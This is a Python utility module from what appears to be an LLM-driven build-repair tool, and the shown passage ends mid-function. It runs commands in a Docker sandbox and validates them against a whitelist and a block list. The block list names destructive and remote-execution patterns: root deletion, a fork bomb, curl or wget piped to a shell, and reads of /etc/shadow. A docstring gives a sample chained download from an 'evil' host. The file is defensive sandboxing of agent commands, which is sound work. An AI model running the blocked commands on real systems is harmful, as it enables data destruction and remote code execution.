#############################################################################
# Copyright (c) 2026 10xEngineers
#
# Author: Akif Ejaz <akif.ejaz@10xengineers.ai>
# This program and the accompanying materials are made available under the
# terms of the MIT License which is available at
# https://opensource.org/licenses/MIT.
#
# SPDX-License-Identifier: MIT
#############################################################################

"""Low-level utilities for command execution and file I/O.

Provides Docker-aware file and command operations together with
safety validation of shell commands.
"""

import logging
import os
import random
import re
import subprocess
import time
from typing import Optional, Tuple

from src.state import CommandResult

# Config values (_IN_DOCKER, WORKSPACE_ROOT) are imported lazily inside
# functions to keep the module-level import surface minimal and avoid
# import cycles.

logger = logging.getLogger(__name__)


# ============================================================================
# COMMAND VALIDATION
# ============================================================================


# Environment variables whose VALUE must never appear in a process
_SECRET_ENV_MARKERS = (
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSWD",
    "API_KEY",
    "AUTH",
    "CREDENTIAL",
    "GIT_CONFIG_VALUE",
)


def _is_secret_env_key(env_key: str) -> bool:
    """Return True when ``env_key``'s value must stay out of argv."""
    upper = env_key.upper()
    return any(marker in upper for marker in _SECRET_ENV_MARKERS)


def _strip_quoted(command: str) -> str:
    """Return ``command`` with quoted regions removed.

    Used so metacharacter checks only see SHELL-significant characters,
    not the same character appearing inside a quoted literal (e.g. a
    ``>`` inside a grep pattern).
    """
    out: list = []
    quote = None
    for ch in command:
        if quote:
            if ch == quote:
                quote = None
            continue
        if ch in ("'", '"'):
            quote = ch
            continue
        out.append(ch)
    return "".join(out)


class CommandValidator:
    """Smart command validation that allows legitimate operations.

    Uses a whitelist approach: explicitly allow safe patterns and
    block dangerous ones. Validation is per SEGMENT (see
    :meth:`split_segments`) so a chained tail cannot ride along on an
    approved first token.
    """

    # Allowed command patterns (whitelist)
    SAFE_COMMANDS = {
        # File operations
        r"^ls(\s+.*)?$",
        r"^cat\s+",
        r"^head\s+",
        r"^tail\s+",
        r"^find\s+",
        r"^tree\s+",
        r"^file\s+",
        r"^stat\s+",
        # Search operations (FIXED: Previously blocked!)
        r"^grep\s+(-[a-zA-Z]+\s+)*",  # grep with optional flags
        r"^awk\s+",
        r"^sed\s+",
        r"^wc\s+",
        # Build operations
        r"^cmake(\s+.*)?$",
        r"^make(\s+.*)?$",
        r"^ninja(\s+.*)?$",
        # Configure/bootstrap scripts: catch ./configure, ./Configure,
        # ./config, ./buildconf, ./buildconf.sh, ./autogen.sh,
        # ./bootstrap[.sh], ./setup, etc. Some upstreams (openssl, curl)
        # ship driver scripts without extensions so we keep the suffix
        # optional.
        r"^\./[A-Za-z][A-Za-z0-9_.-]*(\s+.*)?$",
        r"^autoreconf(\s+.*)?$",
        r"^autoconf(\s+.*)?$",
        r"^automake(\s+.*)?$",
        r"^libtoolize(\s+.*)?$",
        r"^aclocal(\s+.*)?$",
        r"^autoheader(\s+.*)?$",
        r"^meson(\s+.*)?$",
        r"^cargo(\s+.*)?$",
        r"^npm(\s+.*)?$",
        r"^pip(\s+.*)?$",
        r"^python(\s+.*)?$",
        r"^python3(\s+.*)?$",
        r"^perl(\s+.*)?$",
        r"^go(\s+.*)?$",
        r"^git(\s+.*)?$",
        # Package management
        r"^apt-get\s+",
        r"^apt\s+",
        r"^apk\s+",
        r"^yum\s+",
        r"^dnf\s+",
        # File downloads (without piping to shell)
        r"^wget\s+(?!.*\|\s*(bash|sh|zsh|fish))",  # wget but not wget | shell
        r"^curl\s+(?!.*\|\s*(bash|sh|zsh|fish))",  # curl but not curl | shell
        # Git operations
        r"^git\s+",
        # Compilation
        r"^gcc\s+",
        r"^g\+\+\s+",
        r"^clang\s+",
        r"^rustc\s+",
        # Testing
        r"^ctest\s+",
        r"^pytest\s+",
        r"^cargo\s+test",
        # Directory operations
        r"^mkdir\s+-p\s+",
        r"^cd\s+",
        r"^pwd",
        # Text processing
        r"^echo\s+",
        r"^printf\s+",
        r"^tr\s+",
        r"^cut\s+",
        r"^sort\s+",
        r"^uniq\s+",
        # Environment and Shell
        r"^export\s+",
        r"^env\s+",
        # Variable assignments. Lower-case names are allowed because
        # internal helper scripts use them (e.g. `_rc=$?` in the static
        # archive probe); segment validation makes this safe.
        r"^[A-Za-z_][A-Za-z0-9_.]*=.*",
        r"^sh\s+",
        r"^bash\s+",
        r"^set\s+-[a-zA-Z]+$",  # `set -e` in bootstrap scripts
        r"^exit\s+\$?[A-Za-z0-9_]*$",  # `exit $_rc`
        r"^true$",  # no-op left by _strip_bundled_toolchain_packages
        # Segment-position helpers: these appear AFTER a pipe in
        # internally-constructed commands and must validate on their
        # own now that every segment is checked.
        r"^xargs(\s+.*)?$",
        r"^head(\s+.*)?$",
        r"^tail(\s+.*)?$",
        r"^wc(\s+.*)?$",
        r"^tr\s+",
        r"^ar\s+[a-z]+\s+",  # `ar x <archive>` (static-lib arch probe)
        r"^flock\s+",  # pkg-manager serialization wrapper
        r"^timeout\s+",  # in-container runaway guard
        # System
        r"^touch\s+",
        r"^chmod\s+",
        r"^patch\s+",
        r"^diff\s+",
        r"^tar\s+",
        r"^unzip\s+",
        r"^cp\s+",
        r"^mv\s+",
        r"^rm\s+",  # DANGEROUS_PATTERNS block only truly dangerous forms
        # Discovery
        r"^which\s+",
        r"^uname\s+",
        r"^test\s+",
        r"^base64\s+",
        r"^sleep\s+\d",  # backoff retries
        r"^ln\s+",  # symlinks (gosec used ln -s)
        r"^ldconfig(\s+.*)?$",
        r"^update-alternatives\s+",
        # Versioned Go binaries installed via `golang.org/dl/goX.Y` (cariddi)
        r"^/root/go/bin/go\d+\.\d+\b",
        # Shell conditionals and control flow
        r"^if\s+",
        r"^\[\s+",  # [ test ]
        r"^\[\[\s+",  # [[ test ]]
        r"^then\s*",
        r"^else\s*",
        r"^elif\s+",
        r"^fi\s*$",
        r"^for\s+",
        r"^while\s+",
        r"^do\s*",
        r"^done\s*$",
        r"^case\s+",
        r"^esac\s*$",
        r"^\{\s*$",
        r"^\}\s*$",
    }

    # Dangerous patterns to block (blacklist)
    DANGEROUS_PATTERNS = {
        # Root deletion — must be genuinely `rm -rf /` (root) or `/*`,
        # not a path with a real subdirectory like
        # `/workspace/repos/foo`. Any character in the class ``\s``,
        # ``*`` or end-of-line following the ``/`` means it stayed root.
        r"rm\s+-rf\s+/(?:\s|$|\*)",
        r":\(\)\{\s*:\|:\&\s*\}",  # Fork bomb
        r"dd\s+if=/dev/zero\s+of=/dev/sd",  # Disk wipe
        r"mkfs\.",  # Format filesystem
        r"fdisk",  # Partition editing
        r"wget.*\|\s*bash",  # Remote code execution
        r"curl.*\|\s*sh",  # Remote code execution
        r"\beval\s+",  # Eval is dangerous (word-boundary, see below)
        # NOTE: `exec` is NOT blocked outright because
        # `find … -exec sed -i {} \;` is a very common (and safe)
        # refactor pattern emitted by the fixer. Truly dangerous use of
        # `exec` is already covered by other blocks (no
        # shell-redirect-exec, no remote pipe, etc.). Observed root
        # cause for ecoji, garble, go-fasttld failures on 2026-05-23.
        r"(?:^|\s|;|&)exec\s+\S+",  # bare `exec foo` at start of cmd
        r"/etc/shadow",  # System files
        r"/etc/passwd",  # System files
        # Container swap fiddling (host-only, never appropriate).
        r"mkswap\s+|swapon\s+",
        # ------------------------------------------------------------------
        # Container-poisoning guards (run 28020958388: one poisoned
        # container broke 34 subsequent packages on the same worker).
        # ------------------------------------------------------------------
        # Uninstalling packages via the distro manager (autoremove,
        # remove, purge) can silently drop `git`, `ca-certificates`, and
        # other transitive deps we rely on. The base image ships every
        # tool we need; the LLM should never *remove* a package to work
        # around a build failure.
        r"\b(?:apt-get|apt)\s+(?:remove|purge|autoremove)\b",
        r"\bapk\s+del\b",
        r"\bdpkg\s+--(?:remove|purge)\b",
        # Rewriting the apt/apk source lists is the second-most common
        # container-poisoning vector — an LLM adds a broken third-party
        # repo (e.g. `deb.debian.org/debian-ports stable`) and every
        # subsequent `apt-get update` explodes for the rest of the
        # worker's lifetime. Refuse any redirect (`>`, `>>`, `tee -a`)
        # into the apt/apk source lists directories.
        (
            r"(?:>|>>|tee(?:\s+-a)?\s+)"
            r"\s*/etc/apt/(?:sources\.list|sources\.list\.d/)"
        ),
        (r"(?:>|>>|tee(?:\s+-a)?\s+)" r"\s*/etc/apk/repositories(?:\.d/)?"),
        # ``add-apt-repository`` and ``apt-key adv`` both mutate the
        # repo list and can wedge apt if the URL is bad. There's no
        # legitimate need for either inside our sandbox.
        r"\badd-apt-repository\b",
        r"\bapt-key\s+adv\b",
    }

    @staticmethod
    def split_segments(command: str) -> list:
        """Split a command into shell segments, respecting quoting.

        Splits on the operators that start a NEW command word — ``;``,
        ``&&``, ``||``, ``|``, ``&`` and newline — while leaving
        quoted regions (including ``"$(mktemp -d ...)"``) intact.

        Security-critical: the whitelist is applied per segment, so a
        chained tail cannot ride along on an approved first token.

        Args:
            command: The raw command string.

        Returns:
            The non-empty, stripped segments in order.
        """
        segments: list = []
        buf: list = []
        quote = None
        i = 0
        n = len(command)
        while i < n:
            ch = command[i]
            if quote:
                buf.append(ch)
                if ch == quote:
                    quote = None
                i += 1
                continue
            if ch in ("'", '"'):
                quote = ch
                buf.append(ch)
                i += 1
                continue
            if ch == "\\" and i + 1 < n:
                buf.append(ch)
                buf.append(command[i + 1])
                i += 2
                continue
            if command.startswith("&&", i) or command.startswith("||", i):
                segments.append("".join(buf))
                buf = []
                i += 2
                continue
            if ch in ";|&\n":
                segments.append("".join(buf))
                buf = []
                i += 1
                continue
            buf.append(ch)
            i += 1
        segments.append("".join(buf))
        return [s.strip() for s in segments if s.strip()]

    def is_safe(self, command: str) -> Tuple[bool, str]:
        """Check if a command is safe to execute.

        EVERY segment of a chained command must match the whitelist.
        Matching only the first token (the old behaviour) approved the
        whole line, so ``make ; wget http://evil -O /tmp/x`` passed
        because the ``make`` pattern's trailing wildcard consumed the
        ``;`` tail.

        Returns:
            (is_safe, reason)
        """
        # Check dangerous patterns first, against the whole string so
        # cross-segment forms (``curl … | sh``) and substitutions
        # (``$(curl … | sh)``) are still caught.
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, command):
                return False, f"Blocked dangerous pattern: {pattern}"

        segments = self.split_segments(command)
        if not segments:
            return False, "Empty command"

        for segment in segments:
            if not any(
                re.match(pattern, segment) for pattern in self.SAFE_COMMANDS
            ):
                logger.warning(
                    f"Unknown command segment (consider adding to "
                    f"whitelist): {segment[:100]}"
                )
                # Keep the historical wording for a plain (single
                # command) rejection; only name the offending segment
                # when the rejection came from a chain, where saying
                # WHICH part failed is the useful information.
                if len(segments) == 1:
                    return False, "Unknown command pattern (not in whitelist)"
                return (
                    False,
                    f"Unknown command pattern in segment: {segment[:80]}",
                )

        return True, "All segments match safe command patterns"

    def is_safe_single(self, command: str) -> Tuple[bool, str]:
        """Validate an LLM-authored command as a SINGLE invocation.

        Stricter than :meth:`is_safe`: on top of per-segment whitelist
        checks, the command may contain at most one real invocation,
        optionally preceded by a ``cd <dir> &&`` prefix (the idiom the
        prompts teach). Chaining, piping and redirection are refused.

        Rationale: fixer/investigation commands are supposed to be one
        build or inspection step. Allowing chains lets an LLM — whose
        prompt embeds untrusted repo text — assemble a download-then-run
        sequence out of individually-whitelisted pieces.

        Args:
            command: The LLM-proposed command.

        Returns:
            (is_safe, reason)
        """
        ok, reason = self.is_safe(command)
        if not ok:
            return False, reason

        segments = self.split_segments(command)
        # Allow a single leading `cd <dir>` companion, nothing else.
        if len(segments) > 2 or (
            len(segments) == 2 and not segments[0].startswith("cd ")
        ):
            return (
                False,
                "Chained commands are not allowed here; use a single "
                "invocation (optionally prefixed with `cd <dir> &&`)",
            )

        # Redirection would let a single invocation still write
        # arbitrary files (e.g. `echo x > /etc/apk/repositories`).
        for ch in (">", "<"):
            if ch in _strip_quoted(command):
                return False, f"Redirection ({ch}) is not allowed here"

        return True, "Single safe invocation"


# Global validator instance
_validator = CommandValidator()


# ============================================================================
# DOCKER CONFIGURATION
# ============================================================================


class _DockerConfigMeta(type):
    """Metaclass exposing the current container name dynamically.

    ``DockerConfig.CONTAINER_NAME`` resolves the *current* container
    (respecting the ``ATESOR_CONTAINER`` override) at access time, not
    at import time.
    """

    @property
    def CONTAINER_NAME(cls) -> str:  # noqa: N802
        from src.platforms import get_container_name

        return get_container_name()


class DockerConfig(metaclass=_DockerConfigMeta):
    """Docker container configuration. CONTAINER_NAME is profile-driven."""

    WORKSPACE_PATH = "/workspace"  # Path inside container

    @staticmethod
    def is_container_running() -> bool:
        """Check if the active profile's Docker container is running."""
        try:
            result = subprocess.run(
                [
                    "docker",
                    "inspect",
                    "-f",
                    "{{.State.Running}}",
                    DockerConfig.CONTAINER_NAME,
                ],
                capture_output=True,
                text=True,
                timeout=5,
            )
            return result.stdout.strip() == "true"
        except Exception as e:
            logger.error(f"Failed to check container status: {e}")
            return False


# ============================================================================
# COMMAND EXECUTION
# ============================================================================


def execute_command(
    command: str,
    cwd: Optional[str] = None,
    timeout: int = 1800,
    validate: bool = True,
    use_docker: bool = True,
    extra_env: Optional[dict] = None,
) -> CommandResult:
    """Execute a shell command safely.

    Args:
        command: Shell command to execute. Accepts either a ``str`` (run
            through the shell) or a ``list[str]`` (argv form; joined for
            docker exec, passed as ``shell=False`` on the host).
        cwd: Working directory (translated to a container path when
            ``use_docker`` is True).
        timeout: Timeout in seconds.
        validate: Whether to validate command safety.
        use_docker: Whether to execute in the Docker container.
            Defaults to True.
        extra_env: Additional environment variables exported for the
            command. Applied inside the container via ``docker exec
            --env`` and on the host via a merged ``env`` dict. Values
            already present in the process environment are overridden.

    Returns:
        A ``CommandResult`` with output and status.
    """
    from src.config import _IN_DOCKER, WORKSPACE_ROOT

    # Accept argv-form commands for scripted callers that build a list
    # to avoid shell injection. All downstream logic works on strings.
    if isinstance(command, (list, tuple)):
        import shlex

        command = " ".join(shlex.quote(str(part)) for part in command)

    start_time = time.time()

    # If we are ALREADY in Docker, we cannot use docker exec normally
    # and we don't need to.
    if _IN_DOCKER:
        use_docker = False

    # Validate command safety
    if validate:
        is_safe, reason = _validator.is_safe(command)
        if not is_safe:
            logger.warning(f"Command blocked: {command[:100]}")
            logger.warning(f"Reason: {reason}")
            return CommandResult(
                command=command,
                exit_code=1,
                stdout="",
                stderr=f"Command blocked by safety validation: {reason}",
                duration_seconds=0.0,
            )

    # Auto-correct wrong package names for the active distro
    if _is_pkg_command(command):
        command = _fix_pkg_names(command)
        command = _strip_bundled_toolchain_packages(command)

    # Execute command
    host_env = None
    try:
        # FIXED: Execute in Docker container by default
        if use_docker:
            if not DockerConfig.is_container_running():
                logger.error(
                    f"Docker container "
                    f"'{DockerConfig.CONTAINER_NAME}' is not running"
                )
                return CommandResult(
                    command=command,
                    exit_code=1,
                    stdout="",
                    stderr=(
                        f"Docker container "
                        f"'{DockerConfig.CONTAINER_NAME}' is not running"
                    ),
                    duration_seconds=0.0,
                )

            # Build docker exec command
            docker_cmd = ["docker", "exec"]

            # Inject per-call environment overrides (fail-fast git flags,
            # locale, tokens). Applied before the container name, per
            # `docker exec` calling convention.
            if extra_env:
                for env_key, env_val in extra_env.items():
                    if _is_secret_env_key(str(env_key)):
                        if host_env is None:
                            host_env = os.environ.copy()
                        host_env[str(env_key)] = str(env_val)
                        docker_cmd.extend(["--env", str(env_key)])
                    else:
                        docker_cmd.extend(["--env", f"{env_key}={env_val}"])

            # Add working directory if specified
            if cwd:
                # Translate host path to container path if necessary
                container_cwd = cwd
                if cwd.startswith(str(WORKSPACE_ROOT)):
                    container_cwd = cwd.replace(
                        str(WORKSPACE_ROOT), DockerConfig.WORKSPACE_PATH
                    )
                elif not cwd.startswith(DockerConfig.WORKSPACE_PATH):
                    # If it's not relative and not in /workspace, it
                    # might be an absolute host path; try to see if it
                    # contains 'workspace'.
                    if "workspace" in cwd:
                        parts = cwd.split("workspace", 1)
                        container_cwd = DockerConfig.WORKSPACE_PATH + parts[1]

                docker_cmd.extend(["-w", container_cwd])

            # Add container name and command.
            # Wrap package-manager commands with flock to serialize
            # across concurrent agents.
            exec_command = command
            if _is_pkg_command(command):
                import shlex as _shlex

                from src.platforms import get_active_profile

                lock = get_active_profile().pkg_lock_file
                # shlex.quote so a command containing single quotes
                # cannot break out of the sh -c wrapper.
                exec_command = (
                    f"flock -w 120 {lock} sh -c {_shlex.quote(command)}"
                )

            inner_timeout = max(timeout - 30, 10)
            shell_quoted = exec_command.replace("'", "'\"'\"'")
            exec_command = (
                f"timeout --signal=KILL {inner_timeout}s "
                f"bash -c '{shell_quoted}'"
            )
            docker_cmd.extend(
                [DockerConfig.CONTAINER_NAME, "bash", "-c", exec_command]
            )

            logger.debug(
                f"Executing in Docker: "
                f"{' '.join(docker_cmd[:5])}... (cwd: {cwd})"
            )

            result = subprocess.run(
                docker_cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                # Carries the values for any name-only `--env` flags.
                env=host_env,
            )
        else:
            # Execute on host (for git clone, etc.)
            logger.debug(f"Executing on host: {command[:100]}")

            if extra_env:
                host_env = os.environ.copy()
                host_env.update({str(k): str(v) for k, v in extra_env.items()})

            result = subprocess.run(
                command,
                shell=True,
                cwd=cwd,
                capture_output=True,
                text=True,
                timeout=timeout,
                env=host_env,
            )

        duration = time.time() - start_time

        if result.returncode == 0:
            logger.debug(f"Command succeeded: {command[:50]}...")
        else:
            # Retry package-manager commands that fail due to database
            # lock contention (common when multiple agents share one
            # container in batch mode).
            if _is_pkg_lock_error(result) and _is_pkg_command(command):
                pkg_lock_retries = 5
                for retry in range(1, pkg_lock_retries + 1):
                    delay = 5 * retry + random.uniform(0, 3)
                    logger.info(
                        f"pkg lock contention, retry "
                        f"{retry}/{pkg_lock_retries} "
                        f"after {delay:.0f}s: {command[:60]}"
                    )
                    time.sleep(delay)
                    retry_result = subprocess.run(
                        docker_cmd if use_docker else command,
                        shell=not use_docker,
                        cwd=None if use_docker else cwd,
                        capture_output=True,
                        text=True,
                        timeout=timeout,
                        # Preserve extra_env on host retries; docker
                        # retries carry it inside docker_cmd already.
                        env=host_env,
                    )
                    if not _is_pkg_lock_error(retry_result):
                        result = retry_result
                        duration = time.time() - start_time
                        if result.returncode == 0:
                            logger.info(
                                f"pkg command succeeded on retry {retry}"
                            )
                        break

            if result.returncode != 0:
                logger.warning(
                    f"Command failed (exit {result.returncode}): "
                    f"{command[:50]}..."
                )
                logger.warning(f"stderr: {result.stderr[:200]}")

        return CommandResult(
            command=command,
            exit_code=result.returncode,
            stdout=result.stdout,
            stderr=result.stderr,
            duration_seconds=duration,
        )

    except subprocess.TimeoutExpired:
        duration = time.time() - start_time
        logger.error(f"Command timed out after {timeout}s: {command[:50]}")

        # Belt-and-braces: even though we wrap with `timeout --signal=KILL`
        # in-container, also try to kill any matching process from the host so
        # we never leave qemu-emulated builds running forever after a timeout.
        # This is best-effort and never raises.
        if use_docker:
            try:
                cmd_token = (
                    command.strip().split()[0] if command.strip() else ""
                )
                if cmd_token:
                    subprocess.run(
                        [
                            "docker",
                            "exec",
                            DockerConfig.CONTAINER_NAME,
                            "pkill",
                            "-9",
                            "-f",
                            cmd_token,
                        ],
                        capture_output=True,
                        timeout=10,
                    )
            except Exception as kill_exc:  # pragma: no cover - best effort
                logger.debug(
                    f"post-timeout pkill failed (non-fatal): {kill_exc}"
                )

        return CommandResult(
            command=command,
            exit_code=-1,
            stdout="",
            stderr=f"Command timed out after {timeout} seconds",
            duration_seconds=duration,
        )

    except Exception as e:
        duration = time.time() - start_time
        logger.error(f"Command failed with exception: {e}")
        return CommandResult(
            command=command,
            exit_code=-1,
            stdout="",
            stderr=str(e),
            duration_seconds=duration,
        )


def _is_pkg_lock_error(result) -> bool:
    """Detect package-manager lock contention (apk, apt, dpkg)."""
    text = (getattr(result, "stderr", "") or "") + (
        getattr(result, "stdout", "") or ""
    )
    if result.returncode == 0:
        return False
    return (
        "Unable to lock database" in text  # apk
        or "Could not get lock" in text  # apt-get
        or "dpkg frontend lock" in text  # apt-get
        or "Resource temporarily unavailable" in text
        and "lock" in text
    )


def _is_pkg_command(command: str) -> bool:
    """Check if a command invokes the system package manager.

    Recognizes apk, apt, apt-get, and dpkg invocations.
    """
    cmd = command.strip()
    for prefix in ("apk ", "apt-get ", "apt ", "dpkg "):
        if cmd.startswith(prefix):
            return True
    for needle in (
        "apk add",
        "apk update",
        "apk del",
        "apt-get install",
        "apt-get update",
        "apt-get remove",
        "apt install",
        "apt update",
        "apt remove",
    ):
        if needle in cmd:
            return True
    return False


def _fix_pkg_names(command: str) -> str:
    """Auto-correct package names that are wrong for the active distro."""
    from src.platforms import get_active_profile

    profile = get_active_profile()
    corrections = profile.name_corrections
    if not corrections:
        return command
    fixed = command
    for wrong, correct in corrections.items():
        fixed = re.sub(r"\b" + re.escape(wrong) + r"\b", correct, fixed)
    if fixed != command:
        logger.info(
            f"Auto-corrected package names for {profile.name}: "
            f"{command[:80]} → {fixed[:80]}"
        )
    return fixed


# Packages that are bundled in our sandbox images and must NEVER be installed
# via the distro package manager. Doing so on Debian/Ubuntu would pull Go 1.18
# (jammy) which cannot parse modern `go.mod` files (toolchain directive,
# 3-part `go 1.X.Y` version), and on Alpine would shadow the curated /usr/local
# tarball. The pattern is matched as a whole token so we don't strip
# `libgolang-foo` or similar.
_BUNDLED_TOOLCHAIN_TOKENS = (
    re.compile(
        r"^golang(-[a-z0-9.\-]+)?$"
    ),  # golang, golang-go, golang-1.21, golang-1.18-go, ...
    re.compile(r"^go-1\.[0-9]+$"),  # go-1.21, go-1.22, ...
    re.compile(r"^gccgo(-[a-z0-9.\-]+)?$"),  # gccgo, gccgo-12, ...
    # Rust is now baked into BOTH images via rustup (see the
    # RUST_TOOLCHAIN ARG). Installing the distro package puts an older
    # rustc ahead of ~/.cargo/bin on PATH and reintroduces the
    # "rustc <old> is not supported by the following packages" failure
    # that blocked 23 packages. Strip it the same way as Go.
    re.compile(r"^rust(-[a-z0-9.\-]+)?$"),  # rust, rust-doc, rust-std, ...
    re.compile(r"^rustc(-[a-z0-9.\-]+)?$"),  # rustc, rustc-1.75, ...
    re.compile(r"^cargo(-[a-z0-9.\-]+)?$"),  # cargo, cargo-1.75, ...
)


def _strip_bundled_toolchain_packages(command: str) -> str:
    """Strip bundled Go toolchain packages from an install command.

    Removes ``golang*`` / ``gccgo*`` / ``go-1.*`` tokens from any
    package-manager ``install`` command. The sandbox images bake a
    current ``go`` toolchain at ``/usr/local/go``; installing the distro
    package replaces ``/usr/bin/go`` with an outdated copy and breaks
    every modern Go build (observed root cause for ~25 % of Debian
    batch failures).

    Only the install verb is touched (``apk add``, ``apt-get install``,
    ``apt install``). If stripping leaves the install with no packages,
    the whole install clause is replaced with a harmless ``true`` so
    command chaining (``apt-get install … && go build …``) keeps
    working.

    Tolerates the option being placed either before OR after
    ``install``:
        - apt-get install -y golang
        - apt-get -y install golang
        - apt install --no-install-recommends golang
        - DEBIAN_FRONTEND=noninteractive apt-get install golang

    Args:
        command: The shell command to sanitize.

    Returns:
        The command with bundled-toolchain packages removed.
    """
    # Match the full install clause up to the next shell separator.
    # Options/flags can appear in any position between the manager and the
    # package list, so we accept them anywhere using a permissive token class.
    install_re = re.compile(
        r"(apt-get|apt|apk)\s+"  # 1: pkg manager
        # 2: pre-verb flags.
        r"((?:-{1,2}[A-Za-z0-9][A-Za-z0-9-]*(?:=\S+)?\s+)*)"
        r"(install|add)\s+"  # 3: verb
        # 4: post-verb flags.
        r"((?:-{1,2}[A-Za-z0-9][A-Za-z0-9-]*(?:=\S+)?\s+)*)"
        r"([^&|;]+?)"  # 5: package list (greedy w/in clause)
        r"(?=\s*(?:&&|\|\||;|$))",
        re.IGNORECASE,
    )

    def _rewrite(match: "re.Match[str]") -> str:
        pm, pre_flags, verb, post_flags, pkgs = (
            match.group(1),
            match.group(2) or "",
            match.group(3),
            match.group(4) or "",
            match.group(5),
        )
        tokens = pkgs.split()
        kept, dropped = [], []
        for tok in tokens:
            if any(rx.match(tok) for rx in _BUNDLED_TOOLCHAIN_TOKENS):
                dropped.append(tok)
            else:
                kept.append(tok)
        if not dropped:
            return match.group(0)
        if not kept:
            logger.warning(
                f"Stripped bundled-toolchain install (no other "
                f"packages requested): {dropped}. Skipping the install "
                f"clause; the sandbox already bakes in current Go "
                f"(/usr/local/go) and Rust (/root/.cargo) toolchains."
            )
            return "true"
        logger.warning(
            f"Stripped bundled-toolchain package(s) from {pm} "
            f"{verb}: {dropped}. The sandbox already bakes in current Go "
            f"(/usr/local/go) and Rust (/root/.cargo) toolchains."
        )
        # Preserve original flag placement
        rebuilt = f"{pm} "
        if pre_flags.strip():
            rebuilt += pre_flags
        rebuilt += verb
        if post_flags.strip():
            rebuilt += " " + post_flags.strip()
        rebuilt += " " + " ".join(kept)
        return rebuilt

    return install_re.sub(_rewrite, command)


# ============================================================================
# FILE OPERATIONS
# ============================================================================


def read_file(
    filepath: str, max_lines: int = 1000, use_docker: bool = True
) -> str:
    """Read file content with line limit.

    Args:
        filepath: Path to file (inside container if use_docker=True)
        max_lines: Maximum lines to read
        use_docker: Whether to read from Docker container

    Returns:
        File content (truncated if needed)
    """
    if use_docker:
        # Read from Docker container. Quote: file names come from
        # cloned repos and may contain spaces/metacharacters.
        import shlex

        result = execute_command(
            f"head -n {max_lines} {shlex.quote(filepath)}", use_docker=True
        )
        if result.success:
            return result.stdout
        else:
            logger.error(
                f"Failed to read file {filepath} from container: "
                f"{result.stderr}"
            )
            return f"Error reading file: {result.stderr}"
    else:
        # Read from host
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                lines = []
                for i, line in enumerate(f):
                    if i >= max_lines:
                        lines.append(
                            f"\n... (truncated after {max_lines} lines)"
                        )
                        break
                    lines.append(line)
                return "".join(lines)
        except Exception as e:
            logger.error(f"Failed to read file {filepath}: {e}")
            return f"Error reading file: {e}"


def write_file(filepath: str, content: str, use_docker: bool = True) -> bool:
    """Write content to file.

    Args:
        filepath: Path to file
        content: Content to write
        use_docker: Whether to write in Docker container

    Returns:
        Success status
    """
    if use_docker:
        # Write to Docker container using base64 for robustness
        import base64
        import shlex

        encoded = base64.b64encode(content.encode("utf-8")).decode("ascii")

        # Ensure directory exists
        dir_path = "/".join(filepath.split("/")[:-1])
        if dir_path:
            execute_command(
                f"mkdir -p {shlex.quote(dir_path)}", use_docker=True
            )

        result = execute_command(
            f"echo '{encoded}' | base64 -d > {shlex.quote(filepath)}",
            use_docker=True,
        )
        return result.success
    else:
        # Write to host
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(content)
            logger.info(f"Wrote {len(content)} bytes to {filepath}")
            return True
        except Exception as e:
            logger.error(f"Failed to write file {filepath}: {e}")
            return False


def file_exists(filepath: str, use_docker: bool = True) -> bool:
    """Check if file exists.

    Args:
        filepath: Path to file
        use_docker: Whether to check in Docker container

    Returns:
        True if file exists
    """
    if use_docker:
        import shlex

        result = execute_command(
            f"test -e {shlex.quote(filepath)}", use_docker=True
        )
        return result.success
    else:
        return os.path.exists(filepath)


# ============================================================================
# PATCH OPERATIONS
# ============================================================================


def _convert_codex_envelope_to_unified_diff(
    patch_content: str,
) -> Optional[str]:
    """Convert a Codex/Aider envelope patch to a unified diff.

    Converts a Codex/Aider-style "*** Begin Patch" envelope to a
    standard unified diff that ``patch -p1`` understands.

    The fixer LLM frequently emits envelope patches like::

        *** Begin Patch
        *** Update File: go.mod
        @@
         module github.com/foo/bar
        -go 1.24.0
        +go 1.21
        -toolchain go1.24.0
        *** End Patch

    These are rejected by the unified-diff validator and the fix never
    lands, causing the agent to loop until escalation. Convert them on
    the fly.

    Args:
        patch_content: The raw patch text, possibly enveloped.

    Returns:
        The converted unified diff, or ``None`` if the input is not a
        recognisable envelope.
    """
    text = patch_content.strip()
    if (
        "*** Begin Patch" not in text
        and "*** Update File:" not in text
        and "*** Add File:" not in text
    ):
        return None

    out_chunks: list[str] = []
    current_path: Optional[str] = None
    current_op: Optional[str] = None  # "update" | "add" | "delete"
    body: list[str] = []

    def flush() -> None:
        nonlocal body
        if not current_path or current_op is None:
            body = []
            return
        if current_op == "add":
            # Synthesize a unified diff that adds a new file from /dev/null.
            added_lines = [
                ln[1:] if ln.startswith("+") else ln
                for ln in body
                if not ln.startswith("@@")
            ]
            out_chunks.append(
                f"--- /dev/null\n+++ b/{current_path}\n"
                f"@@ -0,0 +1,{len(added_lines)} @@\n"
                + "".join(f"+{ln}\n" for ln in added_lines)
            )
        elif current_op == "delete":
            out_chunks.append(f"--- a/{current_path}\n+++ /dev/null\n")
        else:
            # update: preserve hunks verbatim, just add file headers.
            # Compute hunk metadata best-effort.
            chunk = f"--- a/{current_path}\n+++ b/{current_path}\n"
            # Find @@ headers; if absent (LLM commonly omits them),
            # wrap in a single hunk that covers what we have.
            has_at = any(ln.startswith("@@") for ln in body)
            if has_at:
                chunk += "".join(ln + "\n" for ln in body)
            else:
                minus = sum(1 for ln in body if ln.startswith("-"))
                plus = sum(1 for ln in body if ln.startswith("+"))
                ctx = sum(
                    1
                    for ln in body
                    if ln.startswith(" ")
                    or (not ln.startswith(("+", "-", "@")))
                )
                old_len = minus + ctx
                new_len = plus + ctx
                chunk += f"@@ -1,{max(old_len,1)} +1,{max(new_len,1)} @@\n"
                for ln in body:
                    if ln.startswith(("+", "-")):
                        chunk += ln + "\n"
                    else:
                        chunk += " " + ln + "\n"
            out_chunks.append(chunk)
        body = []

    for raw in text.splitlines():
        if raw.startswith("*** Begin Patch") or raw.startswith(
            "*** End Patch"
        ):
            flush()
            current_path = None
            current_op = None
            continue
        if raw.startswith("*** Update File:"):
            flush()
            current_path = raw.split(":", 1)[1].strip()
            current_op = "update"
            continue
        if raw.startswith("*** Add File:"):
            flush()
            current_path = raw.split(":", 1)[1].strip()
            current_op = "add"
            continue
        if raw.startswith("*** Delete File:"):
            flush()
